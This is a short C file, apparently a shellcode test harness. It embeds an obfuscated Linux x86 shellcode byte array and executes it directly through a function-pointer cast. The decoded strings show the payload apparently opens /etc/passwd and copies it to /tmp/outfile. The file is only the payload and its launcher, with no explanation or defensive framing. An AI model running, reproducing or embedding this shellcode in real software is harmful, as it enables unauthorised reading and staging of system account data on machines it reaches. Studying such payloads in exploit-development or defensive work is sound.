#include <stdio.h>
#include <string.h>
unsigned char shellcode[] = \
"\x31\xc9\xf7\xe1\x04\x05\xeb\x45\x5e\x80\x76\x0b\xff\x89\xf3\xcd\x80\x93\x89\xc8\x2c\xfd\x66\xf7\xd2\x29\xd4\x89\xe1\xcd\x80\x89\xc7\x8d\x5e\x0c\x80\x73\x0c\xff\x31\xc0\x83\xc0\x05\x31\xc9\x80\xc1\x42\x66\x81\xf2\x5b\xff\xcd\x80\x31\xdb\x93\x83\xc0\x04\x87\xfa\x89\xe1\xcd\x80\x31\xc0\x0c\x01\xb3\x05\xcd\x80\xe8\xb6\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\xff\x2f\x74\x6d\x70\x2f\x6f\x75\x74\x66\x69\x6c\x65\xff"
;

int main(){
        printf("Shellcode Length:  %d\n", strlen(shellcode));
        int (*ret)() = (int(*)())shellcode;
        ret();
}
